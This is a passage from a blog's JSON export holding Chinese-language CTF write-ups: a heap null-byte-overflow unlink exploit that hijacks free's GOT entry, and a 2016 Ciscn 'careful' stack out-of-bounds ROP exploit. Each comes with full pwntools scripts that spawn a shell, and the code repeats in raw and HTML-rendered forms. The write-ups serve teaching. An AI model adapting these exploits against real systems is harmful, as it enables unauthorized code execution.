class=\"comment\"># leak read_addr</span></div><div class=\"line\">\tread_addr=u64(leak(GOT_read).ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"read_addr: \"</span>+str(hex(read_addr))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\tsystem_addr=read_addr<span class=\"number\">-0x980C0</span></div><div class=\"line\">\t<span class=\"comment\"># system_addr= read_addr-0xeb6a0 +0x46590</span></div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># modify free to system</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(system_addr)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tedit(<span class=\"number\">4</span>,<span class=\"string\">\"/bin/sh\"</span>)</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># now get shell</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\"></div><div class=\"line\">\tio.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>一道堆中的null byte溢出题</p>\n<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>","more":"<p>由于读取输入的时候会在最后再添加’\\x00’：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">.text:00000000004008E4                 cdqe</div><div class=\"line\">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class=\"line\">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class=\"line\">.text:00000000004008EE                 add     rax, rdx</div><div class=\"line\">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class=\"line\">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class=\"line\">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>\n<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>\n<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">CANARY    : ENABLED</div><div class=\"line\">FORTIFY   : disabled</div><div class=\"line\">NX        : ENABLED</div><div class=\"line\">PIE       : disabled</div><div class=\"line\">RELRO     : Partial</div></pre></td></tr></table></figure>\n<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href=\"https://github.com/niklasb/libc-database\">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>\n<p>然后泄漏出来算下偏移就可以调用system()了</p>\n<p>Exploit:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">io=process(<span class=\"string\">'./fb'</span>)</div><div class=\"line\"><span class=\"comment\"># io = remote(\"114.55.103.213\",9733)</span></div><div class=\"line\"></div><div class=\"line\">SIZE=<span class=\"number\">0xf8</span></div><div class=\"line\">PLT_puts=<span class=\"number\">0x4006C0</span></div><div class=\"line\">GOT_free=<span class=\"number\">0x602018</span></div><div class=\"line\">GOT_read=<span class=\"number\">0x602040</span></div><div class=\"line\">FD=<span class=\"number\">0x6020C8</span></div><div class=\"line\">BK=<span class=\"number\">0x6020D0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init</span><span class=\"params\">(size)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'length:'</span>)</div><div class=\"line\">\tio.sendline(str(size))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,content)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'content:'</span>)</div><div class=\"line\">\tio.sendline(str(content))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span><span class=\"params\">(dst)</span>:</span></div><div class=\"line\">\tedit(<span class=\"number\">1</span>,p64(dst)+p64(SIZE)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'0'</span>)</div><div class=\"line\">\tleakmem = io.recvuntil(<span class=\"string\">\"Done~\"</span>)[:<span class=\"number\">-6</span>]</div><div class=\"line\">\t<span class=\"keyword\">return</span> str(leakmem)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"></div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\"></div><div class=\"line\">\tpayload=p64(<span class=\"number\">0xf1</span>)+p64(<span class=\"number\">0xf1</span>)+p64(FD)+p64(BK)+<span class=\"string\">'A'</span>*<span class=\"number\">0xd0</span>+p64(<span class=\"number\">0xf0</span>)</div><div class=\"line\">\t<span class=\"comment\"># overflow null byte</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload)</div><div class=\"line\">        <span class=\"comment\"># gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))</span></div><div class=\"line\">\tdelete(<span class=\"number\">3</span>)</div><div class=\"line\">        </div><div class=\"line\">\tpayload2=p64(SIZE)+p64(<span class=\"number\">0x6020C0</span>)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload2)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># modify GOT entry of free to PLT entry of puts</span></div><div class=\"line\">\t<span class=\"comment\"># use [:1] to prevent \\x00 from causing damage</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(PLT_puts)[:<span class=\"number\">-1</span>])</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># leak read_addr</span></div><div class=\"line\">\tread_addr=u64(leak(GOT_read).ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"read_addr: \"</span>+str(hex(read_addr))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\tsystem_addr=read_addr<span class=\"number\">-0x980C0</span></div><div class=\"line\">\t<span class=\"comment\"># system_addr= read_addr-0xeb6a0 +0x46590</span></div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># modify free to system</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(system_addr)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tedit(<span class=\"number\">4</span>,<span class=\"string\">\"/bin/sh\"</span>)</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># now get shell</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\"></div><div class=\"line\">\tio.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"},{"title":"Ciscn CTF 2016 careful writeup","date":"2016-07-11T09:13:00.000Z","_content":"\n现在才知道原来system(\"sh\")也可以拿shell……一直以为只能用system(\"/bin/sh\")……\n\n题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：\n\n<!--more-->\n\n![ciscnctf_2016_careful_writeup0.png][1]\n\n\n循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。\n\n由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。\n\n完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。\n\n后来才知道原来只要\"sh\"其实也是可以的，用ROPgadget搜出个\"sh\"就可以了,我真的是拒绝的。\n\n于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./careful')\n# p=remote('106.75.32.79',10000)\n\n# popret='080483a1'\n# printf='080483c0'\n# fflush='080483d0'\n# system='080483e0'\n# print_got='0804a00c'\n# begin='0804852D'\n# out='08048563'\n\nsystem='080483e0'\nsh='0804828e'\n\ndef w(index,value):\n\tp.recvuntil('index:')\n\tp.sendline(str(index))\n\tp.recvuntil('value:')\n\tvalue='0A0A0A'+value\n\tc=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\ndef reset():\n\tw(28,'00')\n\ndef end():\n\tw(28,'11')\n\ndef wdword(index,word):\n\tw(index,word[6:])\n\tw(index+1,word[4:6])\n\tw(index+2,word[2:4])\n\tw(index+3,word[0:2])\n\treset()\n\ndef main():\n\t\"\"\"\n\t# write print addr\n\twdword(44,printf)\n\twdword(48,popret)\n\twdword(52,print_got)\n\twdword(56,begin)\n\t# wdword(60,popret)\n\t# wdword(64,out)\n\t# wdword(68,begin)\n\t# gdb.attach(p,'b *0x8048604')\n\tend()\n\n\trecv=p.recv(4)\n\n\tsys_addr=u32(recv.ljust(4,'\\x00'))\n\tprint 'system addr: '+hex(sys_addr)\n\tsh_addr=sys_addr-0x4cbd0+0x15d1a9\n\tprint '/bin/sh addr: '+hex(sh_addr)\n\n\t# gdb.attach(p,'b *0x08048604')\n\tp.sendline('28')\n\tp.recvuntil('value:')\n        value='0A0A0A00'\n        c=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\n\twdword(44,system)\n\twdword(52,hex(sh_addr)[2:])\n\tend()\n\t# gdb.attach(p,'b *0x8048604')\n\tp.interactive()\n\t\"\"\"\n\twdword(44,system)\n\twdword(52,sh)\n\tend()\n\tp.interactive()\n\nmain()\n\n```\n\n\n[1]: /images/ciscnctf_2016_careful_writeup0.png\n","source":"_posts/ciscnctf_2016_careful_writeup.md","raw":"title: Ciscn CTF 2016 careful writeup\n\ndate: 2016/07/11 17:13:00\n\n---\n\n现在才知道原来system(\"sh\")也可以拿shell……一直以为只能用system(\"/bin/sh\")……\n\n题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：\n\n<!--more-->\n\n![ciscnctf_2016_careful_writeup0.png][1]\n\n\n循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。\n\n由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。\n\n完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。\n\n后来才知道原来只要\"sh\"其实也是可以的，用ROPgadget搜出个\"sh\"就可以了,我真的是拒绝的。\n\n于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./careful')\n# p=remote('106.75.32.79',10000)\n\n# popret='080483a1'\n# printf='080483c0'\n# fflush='080483d0'\n# system='080483e0'\n# print_got='0804a00c'\n# begin='0804852D'\n# out='08048563'\n\nsystem='080483e0'\nsh='0804828e'\n\ndef w(index,value):\n\tp.recvuntil('index:')\n\tp.sendline(str(index))\n\tp.recvuntil('value:')\n\tvalue='0A0A0A'+value\n\tc=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\ndef reset():\n\tw(28,'00')\n\ndef end():\n\tw(28,'11')\n\ndef wdword(index,word):\n\tw(index,word[6:])\n\tw(index+1,word[4:6])\n\tw(index+2,word[2:4])\n\tw(index+3,word[0:2])\n\treset()\n\ndef main():\n\t\"\"\"\n\t# write print addr\n\twdword(44,printf)\n\twdword(48,popret)\n\twdword(52,print_got)\n\twdword(56,begin)\n\t# wdword(60,popret)\n\t# wdword(64,out)\n\t# wdword(68,begin)\n\t# gdb.attach(p,'b *0x8048604')\n\tend()\n\n\trecv=p.recv(4)\n\n\tsys_addr=u32(recv.ljust(4,'\\x00'))\n\tprint 'system addr: '+hex(sys_addr)\n\tsh_addr=sys_addr-0x4cbd0+0x15d1a9\n\tprint '/bin/sh addr: '+hex(sh_addr)\n\n\t# gdb.attach(p,'b *0x08048604')\n\tp.sendline('28')\n\tp.recvuntil('value:')\n        value='0A0A0A00'\n        c=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\n\twdword(44,system)\n\twdword(52,hex(sh_addr)[2:])\n\tend()\n\t# gdb.attach(p,'b *0x8048604')\n\tp.interactive()\n\t\"\"\"\n\twdword(44,system)\n\twdword(52,sh)\n\tend()\n\tp.interactive()\n\nmain()\n\n```\n\n\n[1]: /images/ciscnctf_2016_careful_writeup0.png\n","slug":"ciscnctf_2016_careful_writeup","published":1,"updated":"2016-11-01T13:30:38.884Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuzk2ok70000r1608jt7cusq","content":"<p>现在才知道原来system(“sh”)也可以拿shell……一直以为只能用system(“/bin/sh”)……</p>\n<p>题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：</p>\n<a id=\"more\"></a>\n<p><img src=\"/images/ciscnctf_2016_careful_writeup0.png\" alt=\"ciscnctf_2016_careful_writeup0.png\"></p>\n<p>循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。</p>\n<p>由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。</p>\n<p>完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。</p>\n<p>后来才知道原来只要”sh”其实也是可以的，用ROPgadget搜出个”sh”就可以了,我真的是拒绝的。</p>\n<p>于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./careful'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.32.79',10000)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># popret='080483a1'</span></div><div class=\"line\"><span class=\"comment\"># printf='080483c0'</span></div><div class=\"line\"><span class=\"comment\"># fflush='080483d0'</span></div><div class=\"line\"><span class=\"comment\"># system='080483e0'</span></div><div class=\"line\"><span class=\"comment\"># print_got='0804a00c'</span></div><div class=\"line\"><span class=\"comment\"># begin='0804852D'</span></div><div class=\"line\"><span class=\"comment\"># out='08048563'</span></div><div class=\"line\"></div><div class=\"line\">system=<span class=\"string\">'080483e0'</span></div><div class=\"line\">sh=<span class=\"string\">'0804828e'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(index,value)</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tp.sendline(str(index))</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'value:'</span>)</div><div class=\"line\">\tvalue=<span class=\"string\">'0A0A0A'</span>+value</div><div class=\"line\">\tc=c_int32(int(value,<span class=\"number\">16</span>)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">reset</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">end</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'11'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wdword</span><span class=\"params\">(index,word)</span>:</span></div><div class=\"line\">\tw(index,word[<span class=\"number\">6</span>:])</div><div class=\"line\">\tw(index+<span class=\"number\">1</span>,word[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">2</span>,word[<span class=\"number\">2</span>:<span class=\"number\">4</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">3</span>,word[<span class=\"number\">0</span>:<span class=\"number\">2</span>])</div><div class=\"line\">\treset()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"string\">\"\"\"</span></div><div class=\"line\">\t# write print addr</div><div class=\"line\">\twdword(44,printf)</div><div class=\"line\">\twdword(48,popret)</div><div class=\"line\">\twdword(52,print_got)</div><div class=\"line\">\twdword(56,begin)</div><div class=\"line\">\t# wdword(60,popret)</div><div class=\"line\">\t# wdword(64,out)</div><div class=\"line\">\t# wdword(68,begin)</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tend()</div><div class=\"line\"></div><div class=\"line\">\trecv=p.recv(4)</div><div class=\"line\"></div><div class=\"line\">\tsys_addr=u32(recv.ljust(4,'\\x00'))</div><div class=\"line\">\tprint 'system addr: '+hex(sys_addr)</div><div class=\"line\">\tsh_addr=sys_addr-0x4cbd0+0x15d1a9</div><div class=\"line\">\tprint '/bin/sh addr: '+hex(sh_addr)</div><div class=\"line\"></div><div class=\"line\">\t# gdb.attach(p,'b *0x08048604')</div><div class=\"line\">\tp.sendline('28')</div><div class=\"line\">\tp.recvuntil('value:')</div><div class=\"line\">        value='0A0A0A00'</div><div class=\"line\">        c=c_int32(int(value,16)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\">\twdword(44,system)</div><div class=\"line\">\twdword(52,hex(sh_addr)[2:])</div><div class=\"line\">\tend()</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tp.interactive()</div><div class=\"line\">\t\"\"\"</div><div class=\"line\">\twdword(<span class=\"number\">44</span>,system)</div><div class=\"line\">\twdword(<span class=\"number\">52</span>,sh)</div><div class=\"line\">\tend()</div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>现在才知道原来system(“sh”)也可以拿shell……一直以为只能用system(“/bin/sh”)……</p>\n<p>题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：</p>","more":"<p><img src=\"/images/ciscnctf_2016_careful_writeup0.png\" alt=\"ciscnctf_2016_careful_writeup0.png\"></p>\n<p>循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。</p>\n<p>由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。</p>\n<p>完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。</p>\n<p>后来才知道原来只要”sh”其实也是可以的，用ROPgadget搜出个”sh”就可以了,我真的是拒绝的。</p>\n<p>于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./careful'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.32.79',10000)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># popret='080483a1'</span></div><div class=\"line\"><span class=\"comment\"># printf='080483c0'</span></div><div class=\"line\"><span class=\"comment\"># fflush='080483d0'</span></div><div class=\"line\"><span class=\"comment\"># system='080483e0'</span></div><div class=\"line\"><span class=\"comment\"># print_got='0804a00c'</span></div><div class=\"line\"><span class=\"comment\"># begin='0804852D'</span></div><div class=\"line\"><span class=\"comment\"># out='08048563'</span></div><div class=\"line\"></div><div class=\"line\">system=<span class=\"string\">'080483e0'</span></div><div 